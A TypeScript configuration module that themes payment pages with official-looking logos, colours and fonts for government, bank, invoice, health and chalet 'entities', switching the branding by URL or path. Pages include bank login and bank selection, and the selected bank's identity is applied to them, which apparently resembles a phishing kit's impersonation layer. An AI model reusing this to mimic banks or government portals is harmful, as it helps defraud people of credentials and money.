export interface IdentityColors {
  primary: string;
  secondary: string;
  background: string;
}

export interface IdentityButtons {
  style: 'rounded' | 'flat' | 'square';
  hover: 'darken' | 'highlight' | 'scale';
}

export interface EntityIdentity {
  logo: string;
  animated_header_images: string[];
  header_position: 'below_top_bar' | 'top' | 'center';
  colors: IdentityColors;
  fonts: string[];
  buttons: IdentityButtons;
  background_images: string[];
  dynamic_behavior?: {
    on_bank_selection?: {
      apply_identity: boolean;
    };
  };
}

export interface DynamicIdentityConfig {
  entities: Record<string, EntityIdentity>;
  pages: string[];
  dynamic_application: boolean;
  enforce_official_assets_only: boolean;
}

export const dynamicIdentityConfig: DynamicIdentityConfig = {
  entities: {
    chalets: {
      logo: 'official_logo_chalets.png',
      animated_header_images: ['chalets_image1.png', 'chalets_image2.png', 'chalets_image3.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#FF6F00',
        secondary: '#FFA000',
        background: '#FFF3E0'
      },
      fonts: ['Roboto', 'Arial'],
      buttons: {
        style: 'rounded',
        hover: 'darken'
      },
      background_images: ['chalets_bg1.png', 'chalets_bg2.png']
    },
    government_payment: {
      logo: 'official_logo_gov.png',
      animated_header_images: ['gov_image1.png', 'gov_image2.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#004080',
        secondary: '#0073E6',
        background: '#E6F0FF'
      },
      fonts: ['Arial', 'Tahoma'],
      buttons: {
        style: 'flat',
        hover: 'highlight'
      },
      background_images: ['gov_bg.png']
    },
    local_payment: {
      logo: 'official_logo_local.png',
      animated_header_images: ['local_image1.png', 'local_image2.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#008000',
        secondary: '#00C000',
        background: '#E6FFE6'
      },
      fonts: ['Verdana', 'Arial'],
      buttons: {
        style: 'rounded',
        hover: 'darken'
      },
      background_images: ['local_bg.png']
    },
    invoices: {
      logo: 'official_logo_invoice.png',
      animated_header_images: ['invoice_image1.png', 'invoice_image2.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#800000',
        secondary: '#B22222',
        background: '#FFE6E6'
      },
      fonts: ['Times New Roman', 'Georgia'],
      buttons: {
        style: 'flat',
        hover: 'highlight'
      },
      background_images: ['invoice_bg.png']
    },
    contracts: {
      logo: 'official_logo_contract.png',
      animated_header_images: ['contract_image1.png', 'contract_image2.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#000080',
        secondary: '#0000CD',
        background: '#E6E6FF'
      },
      fonts: ['Georgia', 'Times New Roman'],
      buttons: {
        style: 'rounded',
        hover: 'darken'
      },
      background_images: ['contract_bg.png']
    },
    health_links: {
      logo: 'official_logo_health.png',
      animated_header_images: ['health_image1.png', 'health_image2.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#008080',
        secondary: '#20B2AA',
        background: '#E0FFFF'
      },
      fonts: ['Arial', 'Verdana'],
      buttons: {
        style: 'flat',
        hover: 'highlight'
      },
      background_images: ['health_bg.png']
    },
    bank_pages: {
      logo: 'official_logo_bank.png',
      animated_header_images: ['bank_image1.png', 'bank_image2.png'],
      header_position: 'below_top_bar',
      colors: {
        primary: '#0000FF',
        secondary: '#1E90FF',
        background: '#E6F0FF'
      },
      fonts: ['Tahoma', 'Verdana'],
      buttons: {
        style: 'rounded',
        hover: 'darken'
      },
      background_images: ['bank_bg.png'],
      dynamic_behavior: {
        on_bank_selection: {
          apply_identity: true
        }
      }
    }
  },
  pages: [
    'payment_main',
    'payment_details',
    'confirmation',
    'history',
    'subpages',
    'recipient_data',
    'bank_login',
    'bank_selection'
  ],
  dynamic_application: true,
  enforce_official_assets_only: true
};

export const getEntityIdentity = (entityKey: string): EntityIdentity | null => {
  return dynamicIdentityConfig.entities[entityKey] || null;
};

export const getAllEntities = (): string[] => {
  return Object.keys(dynamicIdentityConfig.entities);
};

export const isValidEntity = (entityKey: string): boolean => {
  return entityKey in dynamicIdentityConfig.entities;
};

export const getEntityPages = (): string[] => {
  return dynamicIdentityConfig.pages;
};

export const shouldEnforceOfficialAssets = (): boolean => {
  return dynamicIdentityConfig.enforce_official_assets_only;
};

export const getButtonStyles = (buttons: IdentityButtons) => {
  const baseStyles = 'px-6 py-3 font-semibold transition-all duration-300';
  
  const styleVariants = {
    rounded: 'rounded-full',
    flat: 'rounded-none',
    square: 'rounded-md'
  };
  
  const hoverVariants = {
    darken: 'hover:brightness-90',
    highlight: 'hover:brightness-110 hover:shadow-lg',
    scale: 'hover:scale-105'
  };
  
  return `${baseStyles} ${styleVariants[buttons.style]} ${hoverVariants[buttons.hover]}`;
};

export const getFontFamily = (fonts: string[]): string => {
  return fonts.map(font => 
    font.includes(' ') ? `"${font}"` : font
  ).join(', ') + ', sans-serif';
};

const ENTITY_STORAGE_KEY = 'current_entity_identity';

export const setCurrentEntity = (entityKey: string): void => {
  if (isValidEntity(entityKey)) {
    localStorage.setItem(ENTITY_STORAGE_KEY, entityKey);
    sessionStorage.setItem(ENTITY_STORAGE_KEY, entityKey);
  }
};

export const getCurrentEntity = (): string | null => {
  return sessionStorage.getItem(ENTITY_STORAGE_KEY) || 
         localStorage.getItem(ENTITY_STORAGE_KEY);
};

export const clearCurrentEntity = (): void => {
  localStorage.removeItem(ENTITY_STORAGE_KEY);
  sessionStorage.removeItem(ENTITY_STORAGE_KEY);
};

export const getEntityFromUrl = (): string | null => {
  const params = new URLSearchParams(window.location.search);
  return params.get('entity');
};

export const detectEntityFromPath = (): string | null => {
  const path = window.location.pathname;
  
  if (path.includes('/create/') && path.includes('/chalet')) return 'chalets';
  if (path.includes('/create/') && path.includes('/payment')) return 'government_payment';
  if (path.includes('/invoices/')) return 'invoices';
  if (path.includes('/contracts/')) return 'contracts';
  if (path.includes('/health/')) return 'health_links';
  if (path.includes('/bank')) return 'bank_pages';
  if (path.includes('/pay/')) return 'local_payment';
  
  return null;
};

export const resolveEntityIdentity = (): EntityIdentity | null => {
  const urlEntity = getEntityFromUrl();
  if (urlEntity && isValidEntity(urlEntity)) {
    setCurrentEntity(urlEntity);
    return getEntityIdentity(urlEntity);
  }
  
  const pathEntity = detectEntityFromPath();
  if (pathEntity && isValidEntity(pathEntity)) {
    setCurrentEntity(pathEntity);
    return getEntityIdentity(pathEntity);
  }
  
  const currentEntity = getCurrentEntity();
  if (currentEntity && isValidEntity(currentEntity)) {
    return getEntityIdentity(currentEntity);
  }
  
  return null;
};
